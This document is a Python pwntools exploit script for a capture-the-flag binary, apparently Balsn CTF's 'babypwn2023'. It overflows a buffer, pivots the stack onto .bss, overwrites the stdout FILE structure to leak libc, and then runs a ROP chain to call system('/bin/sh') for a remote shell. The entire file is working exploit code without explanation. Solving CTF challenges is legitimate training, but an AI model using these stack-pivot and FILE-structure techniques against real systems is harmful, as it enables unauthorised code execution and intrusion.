#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# type: ignore

from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts


def logbase():
    log.info("libc base = %#x" % libc.address)


def logleak(name, val):
    log.info(name + " = %#x" % val)


def sa(delim, data):
    return p.sendafter(delim, data)


def sla(delim, line):
    return p.sendlineafter(delim, line)


def sl(line):
    return p.sendline(line)


def rcu(d1, d2=0):
    p.recvuntil(d1, drop=True)
    # return data between d1 and d2
    if (d2):
        return p.recvuntil(d2, drop=True)


exe = ELF('./chall')
libc = ELF('./libc.so.6')

if args.DOCKER:
    host, port = "127.0.0.1", "10105"
else:
    host, port = "babypwn2023.balsnctf.com", "10105"

if args.REMOTE:
    p = remote(host, port)
    if args.DOCKER:
        pause()
else:
    p = process(exe.path)

buff = 0x404c00
pop_rbp = 0x000000000040115d  # pop rbp ; ret
ret = 0x000000000040101a
leave_ret = 0x00000000004011c5

pause()
# first payload , pivot on .bss
payload = b'A' * 0x20 + p64(buff) + p64(0x4011a0)
p.sendline(payload)
# second payload leak stdout by leaving gets/puts stack frame on .bss
payload2 = b'A' * 0x20
payload2 += p64(buff + 0x18) + p64(0x40101a) + p64(exe.sym['puts']) + p64(
    pop_rbp) + p64(0x404b20) + p64(ret) * 10 + p64(0x4011a0)
sla('Baby PWN 2023 :)\n', payload2)

# pivot on bss before stack frame and overwrite stdout address lsb byte with 0
sla('Baby PWN 2023 :)\n', b'A' * 0x20 + p64(0x404b80) +
    p64(0x4011a0) + p64(ret) * 4 + p64(pop_rbp))
# pivot after stdout leak on .bss, then pivot on pop rbp in .bss
sla('Baby PWN 2023 :)\n', p64(0x4011a0) +
    p64(0xdeadbeef) * 3 + p64(0x404b48) + p64(leave_ret))

# now we will pivot before stdout, and will overwrite stdout beginning to
# have a leak & will pivot on last payload
payload3 = b'\x00' * 0x20
payload3 += p64(0x404d08) + p64(0x4011a0)
payload3 = payload3.ljust(0xa0, b'\x00')
# stdout will leak address at 0x404010 which is stdout..
payload3 += p64(0xfbad1800) + p64(0) * 3 + p64(0x404010) + \
    p64(0x404018) * 3 + p64(0x404019)
p.sendline(payload3)

# get our leak & calculate libc
libc.address = u64(rcu(')\n', '\x42').ljust(
    8, b'\x00')) - libc.sym['_IO_2_1_stdout_']
logbase()

# last payload, simple system('/bin/sh')
rop = ROP(libc)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
p.sendline(b'B' * 0x28 + rop.chain())
p.interactive()
